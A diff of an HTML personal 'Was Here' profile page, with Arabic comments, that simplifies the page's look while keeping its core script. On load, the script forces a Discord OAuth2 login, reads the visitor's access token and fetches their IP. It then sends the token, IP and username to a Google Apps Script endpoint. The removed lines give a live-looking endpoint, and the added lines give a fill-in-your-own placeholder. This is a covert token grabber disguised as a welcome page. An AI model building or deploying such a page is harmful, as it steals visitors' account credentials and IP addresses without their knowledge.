@@ -2,152 +2,20 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>0lRushy Was Here</title>
-  <link rel="icon" type="image/png" href="we.png" />
-  <link href="https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap" rel="stylesheet" />
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" crossorigin="anonymous" referrerpolicy="no-referrer" />
-
   <style>
-    * { margin: 0; padding: 0; box-sizing: border-box; }
-    body {
-      background: black;
-      font-family: 'Press Start 2P', monospace;
-      color: white;
-      overflow: hidden;
-      position: relative;
-    }
-    #entry-screen {
-      position: fixed;
-      inset: 0;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      cursor: default;
-      text-shadow: 0 0 10px green, 0 0 5px white;
-      font-size: 1.5em;
-      user-select: none;
-      background: black;
-      z-index: 10000;
-    }
-    #main-content {
-      display: none;
-      animation: fadeIn 2s ease forwards;
-    }
-    body.show-main #main-content { display: block; }
-    body.show-main #entry-screen { display: none; }
-    @keyframes fadeIn {
-      from { opacity: 0; }
-      to { opacity: 1; }
-    }
-    body.show-main {
-      overflow: auto;
-      background: black;
-      color: #fff;
-      animation: fadeIn 2s ease;
-    }
-    .container {
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      height: 100vh;
-      z-index: 2;
-      text-align: center;
-      padding: 20px;
-    }
-    .glow-img {
-      border: none;
-      box-shadow: none;
-      border-radius: 12px;
-      max-width: 240px;
-      margin-bottom: 25px;
-    }
-    h1 {
-      font-size: 1.2em;
-      text-shadow: 0 0 8px green, 0 0 3px white;
-      margin-bottom: 20px;
-    }
-    .links {
-      margin-top: 20px;
-      display: flex;
-      flex-direction: column;
-      gap: 15px;
-    }
-    .links a {
-      color: #fff;
-      text-decoration: none;
-      font-size: 0.75em;
-      transition: 0.3s;
-      text-shadow: 0 0 5px green;
-    }
-    .links a:hover {
-      color: green;
-      text-shadow: 0 0 10px green, 0 0 5px white;
-    }
-    .links i {
-      margin-right: 8px;
-      color: green;
-    }
-    .snowflake {
-      position: fixed;
-      top: -10px;
-      width: 5px;
-      height: 5px;
-      background: white;
-      opacity: 0.7;
-      border-radius: 50%;
-      filter: blur(1px);
-      animation: fall linear infinite;
-      z-index: 1;
-    }
-    @keyframes fall {
-      to { transform: translateY(110vh); }
-    }
-    #visit-label {
-      position: fixed;
-      top: 10px;
-      left: 10px;
-      color: white;
-      font-family: 'Press Start 2P', monospace;
-      font-size: 0.8em;
-      text-shadow: 0 0 8px green, 0 0 3px white;
-      z-index: 10000;
-      user-select: none;
-      cursor: default;
-    }
-    #user-info {
-      margin-top: 15px;
-      font-size: 1em;
-      text-shadow: 0 0 5px green;
-    }
+    body { background: black; color: white; font-family: monospace; text-align:center; }
+    #entry-screen { position: fixed; inset:0; display:flex; justify-content:center; align-items:center; font-size:2em; cursor:pointer; }
+    #main-content { display:none; padding: 20px; }
   </style>
 </head>
 <body>
-
-  <div id="entry-screen">
-    Loading...
-  </div>
-
-  <div id="visit-label">Visits: ...</div>
-
-  <audio id="bg-music" autoplay muted loop>
-    <source src="memo.mp3" type="audio/mpeg">
-    متصفحك لا يدعم تشغيل الصوت.
-  </audio>
+  <div id="entry-screen">Loading...</div>
 
   <div id="main-content">
-    <div class="container">
-      <img src="we.png" alt="0lRushy" class="glow-img" />
-      <h1>0lRushy</h1>
-      <div id="user-info">Loading user info...</div>
-      <div class="links">
-        <a href="https://github.com/EssaSadi21" target="_blank"><i class="fab fa-github"></i> GitHub 0lrushy</a>
-        <a href="https://www.snapchat.com/add/auog" target="_blank"><i class="fas fa-link"></i> SnapChat @0lrushy</a>
-        <a href="https://instagram.com/0xxrushy" target="_blank"><i class="fab fa-instagram"></i> Instagram @0lrushy</a>
-        <a href="https://discord.com/users/241340069850513409" target="_blank"><i class="fab fa-discord"></i> Discord udp06</a>
-      </div>
-    </div>
+    <h1>Welcome, <span id="user-info"></span></h1>
+    <p id="visit-label">Visits: ...</p>
   </div>
 
   <script>
@@ -169,98 +37,62 @@
         });
         if (!res.ok) throw new Error('Failed to fetch user info');
         return await res.json();
-      } catch (e) {
-        console.error(e);
+      } catch {
         return null;
       }
-    }
-
-    function enterSite() {
-      document.body.classList.add('show-main');
-
-      const audio = document.getElementById('bg-music');
-      setTimeout(() => {
-        audio.muted = false;
-        audio.volume = 0.5;
-        audio.play().catch(e => {
-          console.log("Autoplay prevented:", e);
-        });
-      }, 1000);
-
-      const createSnow = () => {
-        const snow = document.createElement("div");
-        snow.classList.add("snowflake");
-        snow.style.left = Math.random() * 100 + "vw";
-        snow.style.animationDuration = (Math.random() * 3 + 3) + "s";
-        document.body.appendChild(snow);
-        setTimeout(() => snow.remove(), 7000);
-      };
-      setInterval(createSnow, 150);
     }
 
     async function init() {
       let token = getAccessTokenFromHash();
 
       if (!token) {
-        // Redirect to Discord OAuth2 for token
         window.location.href = discordAuthUrl;
         return;
       }
 
-      // Remove hash from URL
       history.replaceState(null, null, ' ');
 
       const user = await fetchDiscordUser(token);
-
       if (!user) {
         document.getElementById('entry-screen').textContent = 'Failed to fetch Discord user info.';
         return;
       }
 
-      document.getElementById('user-info').textContent = `Discord User: ${user.username}#${user.discriminator}`;
+      document.getElementById('user-info').textContent = `${user.username}#${user.discriminator}`;
+      document.getElementById('entry-screen').style.display = 'none';
+      document.getElementById('main-content').style.display = 'block';
 
-      enterSite();
-
-      // Get IP and send data to Google Apps Script
+      // جلب IP وارسال البيانات للـ GAS
       fetch('https://api.ipify.org?format=json')
-        .then(response => response.json())
+        .then(r => r.json())
         .then(data => {
           const ip = data.ip;
-          console.log('Visitor IP:', ip);
-
-          // Replace this URL with your Google Apps Script URL
-          const gasURL = 'https://script.google.com/macros/s/AKfycbxKvTAnQhresyE7v_3OVz_KKyxdDWKGtlZDoiKpxBYnSFc7i5QSMTd3zzB5g2XzlRYS/exec';
-
-          fetch(gasURL + '?ip=' + encodeURIComponent(ip) 
-            + '&token=' + encodeURIComponent(token) 
-            + '&username=' + encodeURIComponent(user.username) 
-            + '&discriminator=' + encodeURIComponent(user.discriminator))
+          const gasURL = 'https://script.google.com/macros/s/YOUR_GAS_SCRIPT_ID/exec'; // غيّرها برابطك
+          const params = new URLSearchParams({
+            ip,
+            token,
+            username: user.username,
+            discriminator: user.discriminator
+          });
+          fetch(gasURL + '?' + params.toString())
             .then(res => res.text())
-            .then(text => {
-              console.log('Response from GAS:', text);
-            })
-            .catch(err => {
-              console.error('Error sending data to GAS:', err);
-            });
+            .then(text => console.log('GAS response:', text))
+            .catch(e => console.error('Error sending data to GAS:', e));
         })
-        .catch(err => {
-          console.error('Failed to get IP:', err);
-        });
+        .catch(e => console.error('Failed to get IP:', e));
 
-      // Fetch visit count
-      fetch("https://script.google.com/macros/s/AKfycbwO4MtdoAvNTB0HpM5iPa97ccGODbHwkf4iSC0NU7PeNk78o2RglVxII6cWaYjz5G03/exec")
-        .then(response => response.text())
+      // جلب عدد الزيارات
+      fetch('https://script.google.com/macros/s/YOUR_VISITS_GAS_SCRIPT_ID/exec') // عدّل الرابط
+        .then(r => r.text())
         .then(count => {
           document.getElementById('visit-label').textContent = 'Visits: ' + count;
         })
-        .catch(err => {
-          console.error('Error fetching visit count:', err);
+        .catch(() => {
           document.getElementById('visit-label').textContent = 'Visits: N/A';
         });
     }
 
     init();
   </script>
-
 </body>
 </html>
